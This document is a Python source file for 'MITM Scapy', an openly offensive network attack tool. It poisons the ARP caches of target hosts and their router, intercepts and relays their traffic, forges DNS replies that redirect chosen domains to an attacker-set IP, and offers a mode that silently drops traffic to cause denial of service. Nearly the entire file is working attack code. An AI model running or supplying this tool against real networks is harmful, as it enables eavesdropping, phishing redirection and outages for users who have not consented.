#!/usr/bin/python
# -*- coding: utf-8 -*-

# Copyright 2012 Andrea Villa
#
# This file is part of MITM Scapy.
# MITM Scapy is free software: you can redistribute it and/or modify it under the terms of the
# GNU General Public License as published by the Free Software Foundation, either version 3 of the License,
# or (at your option) any later version.
# MITM Scapy is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even
# the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You can get a copy of the GNU General Public License at http://www.gnu.org/licenses/.


from __future__ import print_function

import os
import sys
import copy
import signal
import select as __select
from time import sleep
from getopt import getopt
from threading import Thread, Lock
from scapy.all import *


def usage():
    print('''	mitm.py [-s seconds, -d pattern:ip, -b n, -f, -N, -v, -h, -D] -t target router

                # -t / --target 		-> Target IP or NET in 192.168.1.0/24 format
                # -s / --poison-seconds		-> Define interval between ARP repoisons (default 5)
                # -f / --force-targets		-> Force more timeout and probes on targets to verify if they are online
                # -h / --half			-> Only poison from target to router, not both ways
                # -N / --no-traditional-routing	-> Enroute without modifying source MAC of the frames
                # -q / --quiet			-> No verbose output
                # -d / --dns-spoof pattern:ip	-> Spoof DNS queries matching "pattern", resolving to ip (specify * to spoof all requests)
                # -b / --buffer-fifo		-> Size of FIFO buffer for conflicting sniff/send (default 30)
                # -D / --dos			-> Don't forward. Resulting in a DoS.
                # router			-> Machine to which intercept packets to''')
    exit()

def get_own_mac(): # Shitty/os-dependent function
    for line in os.popen("/sbin/ifconfig"): 
        if line.find('ether') > -1: 
            return line.split()[1]

def no_target_supplied(opts):
    try:
        [ k[0] for k in opts ].index('-t')
    except ValueError:
        return True
    return False

def parse_opts(opts):
    global target, seconds, force, half, notrad, verbose, dns_spoof, dns_pattern, dns_ip, fifo_size, dos
    for (key, value) in opts:
        if key == '-t' or key == '--target':
            target = value
        elif key == '-s' or key == '--poison-seconds':
            seconds = value
        elif key == '-f' or key == '--force-targets':
            force = True
        elif key == '-h' or key == '--half':
            half = True
        elif key == '-N' or key == '--no-traditional-routing':
            notrad = True
        elif key == '-q' or key == '--quiet':
            verbose = False
        elif key == '-d' or key == '--dns-spoof':
            dns_spoof = True
            dns_pattern, dns_ip = value.split(':')
        elif key == '-b' or key == '--buffer-fifo':
            fifo_size = value
        elif key == '-D' or key == '--dos':
            dos = True
        else:
            usage()
        
def print_v(*args):
    if verbose:
        print(' '.join(args))
        
def ping_n_purge():
    global target, router
    ans, nans = arping(target, verbose = verbose)
    if force:
        print_v('[*] Forcing ping...')
        for i in range(5): # We ping more times with force, and with more timeout
            ans2, nans2 = arping(target, timeout = 5, verbose = verbose)
            ans = ans + ans2
            if len(nans2) == 0: break
    target = {}
    for pkt in ans:
        arp = pkt[1].getlayer(ARP)
        target[arp.psrc] = arp.hwsrc
    ans, nans = arping(router, verbose = verbose)
    arp = ans[0][1].getlayer(ARP)
    router = (arp.psrc, arp.hwsrc)
        
# La función de poison arp de scapy IMAINO que funciona! xD Creo que el autor no tiene claro
# como hacerlo; envia paquetes ARP who-has! Que burro nano...
def arp_poisoner():
    r_ip, r_mac = router
    while True:
        for (ip, mac) in target.items():
            # The source MAC address must be our one to spoof router IP specified in the inner ARP
            p = Ether(dst = mac) / ARP(psrc = r_ip, pdst = ip, hwdst = mac, op = ARP.is_at)
            sendp(p, verbose = False)
            if not half: # Poison router's cache
                p = Ether(dst = r_mac) / ARP(psrc = ip, pdst = r_ip, hwdst = r_mac, op = ARP.is_at)
                sendp(p, verbose = False)
        if poison.acquire(False): # Depoison
            print_v('[*] Undoing ARP poison...')
            for times in range(5):
                for (ip, mac) in target.items():
                    p = Ether(dst = mac) / ARP(psrc = r_ip, pdst = ip, hwsrc = r_mac, hwdst = mac, op = ARP.is_at)
                    sendp(p, verbose = False)
                    if not half:
                        p = Ether(dst = r_mac) / ARP(psrc = ip, pdst = r_ip, hwsrc = mac, hwdst = r_mac, op = ARP.is_at)
                        sendp(p, verbose = False)
                sleep(1)
            print_v('[*] Done.') 
            break
        sleep(seconds)

def is_dns_spoof_request(dns):
    if dns.qr != 0:
        return False
    if dns_pattern == '*' or dns_pattern in dns.qd.qname:
        return True
    return False
    
def spoof_dns(p):
    ip = p.getlayer(IP)
    udp = ip.payload
    dns = p.getlayer(DNS)
    pn = IP(src = ip.dst, dst = ip.src) / UDP(sport = udp.dport, dport = udp.sport)
    pn_dns = DNS(id = dns.id, qr = 1, qd = dns.qd, an = DNSRR(rrname = dns.qd.qname, rdata = dns_ip, ttl = 10))
    sendp(Ether(src = p.dst, dst = p.src) / pn / pn_dns)
    print_v('[+] Spoofed request to', dns.qd.qname,' ->', dns_ip, 'Client:', ip.src)

def is_packet_to_enroute(p):
    if p.dst != own_mac:
        return False
    if p.haslayer(IP):
        ip = p.getlayer(IP) 
        if ip.dst == own_ip or ip.src == own_ip: # This is to/from our own machine
            return False
        if dns_spoof: # We verify if this is a packet to mangle with a DNS spoof
            if p.haslayer(DNS):
                if is_dns_spoof_request(p.getlayer(DNS)):
                    spoof_dns(p)
                    return False
        if ip.dst in arpcache.keys() or ip.src in arpcache.keys(): # If destination/source IP are in our pool permit the forward
            return True
        else:
            return False
    else:
            return False
    return False

class Fifo(list):
    def pushpop(self, e):
        self.insert(0, e)
        self.pop()    

def get_last_layer(p):
    j = -1
    pt = p
    while type(pt) != NoPayload:
        pt = pt.payload
        j += 1
    return p[j]
        
def scapy_dnsrr_bug_workaround(p): # If we form the packet again we don't pass through scapy's buggy str() for DNSRR (with CNAMEs?)
    ip = p.getlayer(IP)
    udp = p.getlayer(UDP)
    dns = p.getlayer(DNS)
    dnsrr = get_last_layer(p.getlayer(DNSRR)) # We extract the last DNSRR record to simplify CNAMEs reconstruction
    n = Ether() / IP(src = ip.src, dst = ip.dst) / UDP(sport = 53, dport = udp.dport) \
        / DNS(id = dns.id, qr = 1, qd = dns.qd, an = DNSRR(rrname = dns.qd.qname, rdata = dnsrr.rdata))
    return n

def mangle_and_forward(p):
    if is_packet_to_enroute(p):
        ip = p.getlayer(IP)
        # If we have the ip.dst in the same LAN the dmac will be the value stored in the cache.
        # Otherwise let the legit router enroute the packet.
        try: dmac = arpcache[ip.dst]
        except KeyError: dmac = router[1]
        if ip.haslayer(DNS) and ip.getlayer(DNS).qr == 1: # Is a response
            p = scapy_dnsrr_bug_workaround(p)
        if notrad: # We don't send with our MAC
            sendp(Ether(src = p.src, dst = dmac) / p[1])
        else: # Traditional routing, we send with our MAC
            sendp(Ether(dst = dmac) / p[1])
        fifo.pushpop(p)
    if sniffing.acquire(False):
        exit()
        
def term_handler(s, f):
    print_v('[!] Received TERM or INT, signaling poisoner thread...')
    poison.release()
    poisoner.join()
    sniffing.release()

own_ip = [x[4] for x in conf.route.routes if x[2] != '0.0.0.0'][0]
own_mac = get_own_mac()
poison, sniffing = Lock(), Lock()
arpcache, target, seconds, force, half, notrad, verbose, dns_spoof, dns_pattern, dns_ip, fifo, fifo_size, dos = [], False, 5, False, False, False, True, False, False, False, None, 30, False

if __name__ == '__main__':
    opts, router = getopt(sys.argv[1:], 'b:s:d:t:fqNhD', ['buffer-fifo=' 'dns-spoof=', 'poison-seconds=', 'target=', 'force-targets', 'quiet', 'no-traditional-routing', 'half', 'dos'])
    if len(router) != 1 or no_target_supplied(opts):
        usage()
    parse_opts(opts)
    
    print_v('[*] Performing ARP scan on target(s):', target)
    ping_n_purge()
    if len(target) == 0:
        print_v('[!] No targets alive. Maybe try with -f ?')
        exit()
    print_v('[*] Starting thread to perform ARP cache poisoning directed to ->', str(router), 'on alive targets:', str(target), ('HALF' if half else 'FULL') + '-DUPLEX')
    poisoner = Thread(target = arp_poisoner)
    poison.acquire()
    poisoner.start()
    arpcache = copy.copy(target)
    arpcache[router[0]] = router[1]
    signal.signal(signal.SIGTERM, term_handler)
    signal.signal(signal.SIGINT, term_handler)
    sniffing.acquire()
    fifo = Fifo([ None ] * fifo_size)
    # Let sending be quiet a little...
    conf.verb = False
    try:
        if not dos:
            print_v('[*] Starting sniffing, mangling and forwarding...')
            while True:
                # Fault tolerance
                try:
                    sniff(prn = mangle_and_forward, lfilter = lambda p : p not in fifo)
                except (TypeError, AttributeError):
                    pass
                except __select.error as e:
                    raise e
                except Exception: # For debugging
                    import pdb
                    pdb.set_trace()
        else:
            print_v('[*] Entering DoS mode, denying forward...')
            signal.pause()
    except KeyboardInterrupt:
        print_v('[!] Received KeyboardInterrupt, signaling poisoner thread...')
        poison.release()
        poisoner.join()
        sniffing.release()
